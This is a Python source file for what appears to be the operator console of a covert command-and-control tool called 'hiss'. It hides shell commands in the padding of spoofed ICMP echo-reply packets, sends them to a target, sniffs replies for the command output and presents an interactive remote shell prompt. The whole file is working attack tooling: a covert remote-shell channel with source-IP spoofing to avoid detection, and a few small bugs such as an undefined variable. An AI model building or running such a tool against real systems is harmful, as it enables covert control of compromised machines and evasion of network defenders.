# Copyright 2023 2xdropout

import base64, binascii, SNEKactions
from scapy.all import *
from os import system
from termcolor import colored

def tx(command,length):
    target = IP(dst=SNEKactions.get_var('target'), src=SNEKactions.get_var('hissSpoofIP'))/ICMP(type=0, code=7, id=1)/Padding(command)
    send(target)


def rx(action, msgCnt):
    
    
    def strip_packet(packet):
        if msgCnt == 1:
            print(colored('stripping packet','blue'))
            print('\n')
        id = packet[ICMP].id
        messageByteLike = packet[Padding].load
        message = messageByteLike.decode()
        code = packet[ICMP].code
        recv = SNEKactions.get_var('hissRecvIP')

        if packet[IP].src != recv:
            errorMessage = 'ERROR! No Packet Recieved from src (' + src + ') destination! Listening again!'
            print(colored(errorMessage, 'red'))
            rx()
        elif code == 6:
            print("Multipackets Incoming!")
            print(id, " packets!")
            rx('print', id)
        elif packet[ICMP].type in [0, 'echo-reply']:
            if code == 7:
                strippedMessage = message.rstrip("\x00")
                length = len(strippedMessage)
                while length % 8 != 0:
                    strippedMessage = "0"+str(strippedMessage)
                    length = len(str(strippedMessage))
                if action == 'print':
                    if msgCnt == 1:
                        print('\n')
                        print(bin_decode(strippedMessage))
                    else:
                        with open('/tmp/.multipacket.tmp','a+') as file:
                            file.write(bin_decode(strippedMessage))
                            print('msgcnt and packetcount:  ', msgCnt, ' ', int(SNEKactions.get_var('hissMultipacketCounter')))
                            if int(SNEKactions.get_var('hissMultipacketCounter')) == msgCnt:
                                print('Printing Response!\n')
                                file.seek(0)
                                for line in file:
                                    print(str(line).rstrip('\n'))
                            else:
                                counter = int(SNEKactions.get_var('hissMultipacketCounter')) + 1
                                SNEKactions.write_vars('hissMultipacketCounter', counter)
                        file.close()
                elif action == 'PWD':
                    getValue = str(bin_decode(strippedMessage))
                    SNEKactions.write_vars('hissPWD',getValue)
                elif action == 'whoami':
                    getValue = str(bin_decode(strippedMessage))
                    SNEKactions.write_vars('hissUser', getValue)
        else:
            print(colored('ERROR! Packet failure! Try Again!', 'red'))
                
    if msgCnt != 1:
        SNEKactions.write_vars('hissMultipacketCounter', '1')
        with open('/tmp/.multipacket.tmp','w') as file:
            pass
        file.close()
    print(colored('Listening for Response', 'blue'))
    sniff(filter = 'icmp', prn=strip_packet,count=msgCnt)


def bin_encode(command):
    values = []
    binary = []
    for char in command:
        values.append(ord(char))
    for value in values:
        bits = str(bin(value)[2:])
        length = len(bits)
        while length < 8:
            bits = "0"+bits
            length = len(bits)
        binary.append(bits)
    value = join_bin(binary)
    return str(value)


def bin_decode(output):
    length = len(output)
    numBytes = length/8
    counter = 0
    byteList = []
    charList = []
    start = 0
    end = 8

    while counter < length:
        byteSection = output[start:end]
        byteList.append(byteSection)
        start = start + 8
        end = end + 8
        counter += 1
    
    
    for value in byteList:
        if value != '':
            baseTwoVal = int(value, 2)
            char = chr(baseTwoVal)
            charList.append(char)
    
    message = "".join(charList)
    return message.rstrip('\n')


def join_bin(list):
    string = [str(i) for i in list]
    returnVal = int("".join(string))
     
    return(returnVal)


def main():
    # Setup
    SNEKactions.write_vars('hissSpoofIP',input('Enter the IP address to be spoofed in the ICMP packets:\n'))
    SNEKactions.write_vars('hissRecvIP',input('Enter the IP address to recieve ICMP packets from:\n'))
    tx(bin_encode('pwd'), 1)
    rx('PWD',1)
    tx(bin_encode('whoami'), 1)
    rx('whoami',1)
    with open('/tmp/.multipacket.tmp','w') as file:
        pass
    file.close()
        
    while True:
        prompt = '\n<<hiss>><' + SNEKactions.get_var('hissUser') + '@' + SNEKactions.get_var('target') + '><' + SNEKactions.get_var('hissPWD') + '>'
        command = input(colored(prompt,'blue'))

        if command[:2] == 'cd':
            getNewPath ='cd ' + SNEKactions.get_var('hissPWD') + ' && ' + 'realpath ' + command[2:]
            tx(bin_encode(getNewPath), 1)
            rx('PWD',1)
        elif '!HISS!' in command:
            print(colored('KILLING LISTENER','yellow','on_blue'))
            tx(bin_encode(command),1)
            return()
        else:
            command = 'cd ' + SNEKactions.get_var('hissPWD') + ' && ' + command
        
        
        tx(bin_encode(command),1)
        rx('print',1)     